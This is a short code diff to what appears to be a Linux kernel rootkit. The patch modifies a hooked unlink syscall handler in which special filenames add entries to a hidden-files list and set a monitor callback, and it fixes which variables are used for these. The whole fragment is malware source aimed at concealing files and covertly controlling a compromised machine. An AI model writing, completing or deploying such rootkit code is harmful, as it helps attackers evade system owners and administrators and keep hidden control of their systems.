@@ -156,7 +156,7 @@ asmlinkage long hooked_unlink(const char __user *filename){
             hidfiles[filenum] = value;
             filenum++;
         }
-        printk("hide %s\n", tmp);
+        printk("hide %s\n", value);
     } else if(strncmp(filename, INEXISTMONITOR, strlen(INEXISTMONITOR)) == 0){
         for(i=0, j=-1; i<strlen(filename); i++){
             if(j>-1){
@@ -168,11 +168,11 @@ asmlinkage long hooked_unlink(const char __user *filename){
         }
         if(j>0){
             value[j] = '\0';
-            monitor = tmp;
+            monitor = value;
         }
     }
     if(monitor != NULL){
-        callMonitor(value);
+        callMonitor(filename);
     }
     return kernel_unlink(filename);
 }
